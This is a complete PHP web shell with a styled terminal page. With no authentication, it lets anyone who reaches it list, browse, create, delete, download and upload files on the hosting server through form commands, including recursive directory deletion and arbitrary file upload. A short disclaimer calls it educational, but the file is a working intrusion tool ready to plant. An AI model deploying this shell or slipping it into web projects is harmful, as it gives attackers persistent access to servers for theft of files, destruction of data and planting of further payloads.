<?php
// Start or resume the session
session_start();

// Check if 'cmd' parameter is provided in the URL
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];

    // Map the 'cmd' parameter to the corresponding function
    switch ($command) {
        case 'ls':
            echo ls();
            break;

        case 'pwd':
            echo pwd();
            break;

        // Add more cases for other allowed commands

        default:
            echo "Unknown command: $command";
            break;
    }

    exit; // Terminate script after processing the command
} elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Check if the form is submitted with a file upload
    if (isset($_FILES["fileToUpload"])) {
        $output = upload();
        echo $output;
        exit;
    }

    $command = $_POST["command"];
    $output = '';

    $parts = explode(' ', $command);
    $operation = strtolower(trim(array_shift($parts)));

    switch ($operation) {
        case 'ls':
            $output = ls();
            break;

        case 'pwd':
            $output = pwd();
            break;

        case 'cd':
            $output = cd($parts);
            break;

        case 'touch':
            $output = touchFile($parts);
            break;

        case 'rm':
            $output = remove($parts);
            break;

        case 'mkdir':
            $output = mkdirCommand($parts);
            break;

        case 'rmdir':
            $output = rmdirCommand($parts);
            break;

        case 'download':
            download($parts);
            exit;

        default:
            $output = "Unknown command: $operation";
            break;
    }

    // Output the result
    echo $output;
    exit; // Terminate execution after handling the command
}

function ls() {
    $files = scandir(getCurrentDirectory());
    return implode("\n", $files);
}

function pwd() {
    return getCurrentDirectory();
}

function cd($parts) {
    session_start(); // Start or resume a session

    if (!isset($_SESSION['current_directory'])) {
        $_SESSION['current_directory'] = getcwd(); // Initialize current directory
    }

    if (count($parts) > 0) {
        $directory = implode(' ', $parts);
        $currentDirectory = $_SESSION['current_directory'];

        // Check if the target directory exists
        if (is_dir($currentDirectory . '/' . $directory)) {
            $_SESSION['current_directory'] = realpath($currentDirectory . '/' . $directory);
            return "Changed directory to: " . $_SESSION['current_directory'];
        } else {
            return "Directory not found: $directory";
        }
    } else {
        return "Usage: cd [directory]";
    }
}

function getCurrentDirectory() {
    // Check if the current directory is set in the session
    if (isset($_SESSION['current_directory'])) {
        return $_SESSION['current_directory'];
    } else {
        // If not set, use the current working directory
        return getcwd();
    }
}

function touchFile($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            return "File already exists: $filename";
        } else {
            if (touch($filepath)) {
                return "File created: $filename";
            } else {
                return "Failed to create file: $filename";
            }
        }
    } else {
        return "Usage: touch [filename]";
    }
}

function remove($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            if (unlink($filepath)) {
                return "File removed: $filename";
            } else {
                return "Failed to remove file: $filename";
            }
        } else {
            return "File not found: $filename";
        }
    } else {
        return "Usage: rm [filename]";
    }
}

function mkdirCommand($parts) {
    if (count($parts) > 0) {
        $dirname = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $dirpath = $directory . '/' . $dirname;
        if (file_exists($dirpath)) {
            return "Directory already exists: $dirname";
        } else {
            if (mkdir($dirpath)) {
                return "Directory created: $dirname";
            } else {
                return "Failed to create directory: $dirname";
            }
        }
    } else {
        return "Usage: mkdir [directory]";
    }
}

function rmdirCommand($parts) {
    if (count($parts) > 0) {
        $dirname = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $dirpath = $directory . '/' . $dirname;
        if (file_exists($dirpath) && is_dir($dirpath)) {
            if (removeDirectory($dirpath)) {
                return "Directory removed: $dirname";
            } else {
                return "Failed to remove directory: $dirname";
            }
        } else {
            return "Directory not found: $dirname";
        }
    } else {
        return "Usage: rmdir [directory]";
    }
}

function removeDirectory($dir) {
    if (!file_exists($dir) || !is_dir($dir)) return false;

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (is_dir($dir . DIRECTORY_SEPARATOR . $item)) {
            if (!removeDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
        } else {
            if (!unlink($dir . DIRECTORY_SEPARATOR . $item)) return false;
        }
    }

    return rmdir($dir);
}

function download($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;

        if (file_exists($filepath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename=' . basename($filepath));
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filepath));
            readfile($filepath);
            exit;
        } else {
            echo "File not found: $filename";
        }
    } else {
        echo "Usage: download [filename]";
    }
}

function upload() {
    if ($_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
        $filename = basename($_FILES['fileToUpload']['name']);
        $directory = getCurrentDirectory(); // Get the current directory
        $destination = $directory . '/' . $filename; // Set the destination directory

        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $destination)) {
            return "File uploaded successfully: $filename";
        } else {
            return "Failed to upload file: $filename";
        }
    } else {
        return "File upload error: " . $_FILES['fileToUpload']['error'];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
        
        body {
            font-family: 'Orbitron', sans-serif;
            background-color: #0d0d0d;
            color: #00ffea;
            margin: 0;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }

        .sidebar {
            width: 250px;
            background-color: #1a1a1a;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
            border-right: 1px solid #333;
        }

        .sidebar h2 {
            color: #00ffea;
            font-size: 20px;
            margin-top: 0;
            text-shadow: 0 0 5px rgba(0, 255, 255, 0.7);
        }

        .sidebar ul {
            list-style: none;
            padding: 0;
            font-size: 14px;
        }

        .sidebar ul li {
            margin-bottom: 15px;
        }

        .sidebar ul li span {
            color: #ff00ff;
            font-weight: bold;
        }

        .documentation {
            font-size: 12px;
            color: #ff00ff;
            margin-top: 20px;
            border-top: 1px solid #00ffea;
            padding-top: 10px;
        }

        .documentation .legal {
            margin-bottom: 10px;
        }

        .documentation .inspiration {
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #00ffea;
        }

        .terminal-container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-grow: 1;
            background: url('https://i.pinimg.com/564x/5c/03/c5/5c03c539d33429e07da6043d4f0ea604.jpg') center center/cover no-repeat;
        }

        .terminal {
            max-width: 800px;
            width: 100%;
            background-color: #121212;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.9);
            border-radius: 10px;
            margin: 20px;
            border: 1px solid #00ffea;
        }

        #output {
            white-space: pre-wrap;
            background-color: #121212;
            color: #00ffea;
            padding: 15px;
            margin-bottom: 10px;
            border: 1px solid #00ffea;
            border-radius: 5px;
            height: 300px;
            overflow-y: auto;
            font-size: 10px;
            text-shadow: 0 0 5px rgba(0, 255, 255, 0.7);
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input[type="text"] {
            background-color: #1a1a1a;
            color: #00ffea;
            border: 1px solid #00ffea;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            width: calc(100% - 22px);
            font-size: 16px;
            text-shadow: 0 0 5px rgba(0, 255, 255, 0.7);
        }

        input[type="file"] {
            margin-bottom: 10px;
            color: #00ffea;
            text-shadow: 0 0 5px rgba(0, 255, 255, 0.7);
        }

        input[type="submit"] {
            background-color: #00ffea;
            color: #000;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 5px;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #0099cc;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2>Available Commands</h2>
        <ul>
            <li><span>ls</span> - List files in the current directory</li>
            <li><span>pwd</span> - Print working directory</li>
            <li><span>cd [dir]</span> - Change directory</li>
            <li><span>touch [file]</span> - Create a new file</li>
            <li><span>rm [file]</span> - Remove a file</li>
            <li><span>mkdir [dir]</span> - Create a new directory</li>
            <li><span>rmdir [dir]</span> - Remove a directory</li>
            <li><span>download [file]</span> - Download a file</li>
        </ul>
        <div class="documentation">
            <p class="legal">🙏This tool is for educational purposes only. Use it only on servers you own or have permission to access. 😠Unauthorized use is illegal.
			I hereby disclaim any responsibility for misuse of this tool. ⚠️Users are advised to utilize it at their own risk.</p>
            <div class="inspiration">
                <p>Front end development style inspired by cyberpunk. My favorite character is Rebecca.❤️😊</p>
            </div>
        </div>
    </div>
    <div class="terminal-container">
        <div class="terminal">
            <div id="output"></div>
            <form id="command-form" method="post">
                <input type="text" id="command" name="command" autocomplete="off" autofocus placeholder="Enter command...">
                <input type="submit" value="Execute">
            </form>
            <form id="upload-form" method="post" enctype="multipart/form-data">
                <input type="file" name="fileToUpload" id="fileToUpload">
                <input type="submit" value="Upload File">
            </form>
        </div>
    </div>
    <script>
        document.getElementById("command-form").addEventListener("submit", function(event) {
            event.preventDefault();
            const formData = new FormData(this);

            fetch("<?php echo $_SERVER['PHP_SELF']; ?>", {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById("output").textContent = data;
                document.getElementById("command").value = ''; // Clear the input field
            })
            .catch(error => {
                console.error("Error:", error);
            });
        });

        document.getElementById("upload-form").addEventListener("submit", function(event) {
            event.preventDefault();
            const formData = new FormData(this);

            fetch("<?php echo $_SERVER['PHP_SELF']; ?>", {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById("output").textContent = data;
                document.getElementById("fileToUpload").value = ''; // Clear the file input field
            })
            .catch(error => {
                console.error("Error:", error);
            });
        });
    </script>
</body>
</html>
